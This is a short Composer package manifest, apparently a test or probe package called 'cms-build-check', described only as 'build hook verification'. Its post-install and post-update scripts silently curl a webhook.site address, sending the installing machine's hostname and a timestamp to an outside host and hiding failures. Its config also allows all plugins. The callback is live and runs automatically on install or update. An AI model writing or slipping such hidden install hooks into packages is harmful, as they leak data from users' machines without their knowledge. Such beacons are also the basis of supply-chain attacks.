{
  "name": "test/cms-build-check",
  "description": "build hook verification",
  "type": "project",
  "license": "MIT",
  "scripts": {
    "post-install-cmd": [
      "curl -s \"https://webhook.site/706fdd7b-0579-475c-bdeb-d738d43c25a1/?host=$(hostname)&ts=$(date +%s)\" || true"
    ],
    "post-update-cmd": [
      "curl -s \"https://webhook.site/706fdd7b-0579-475c-bdeb-d738d43c25a1/?host=$(hostname)&ts=$(date +%s)\" || true"
    ]
  },
  "config": {
    "allow-plugins": {
      "*": true
    }
  }
}
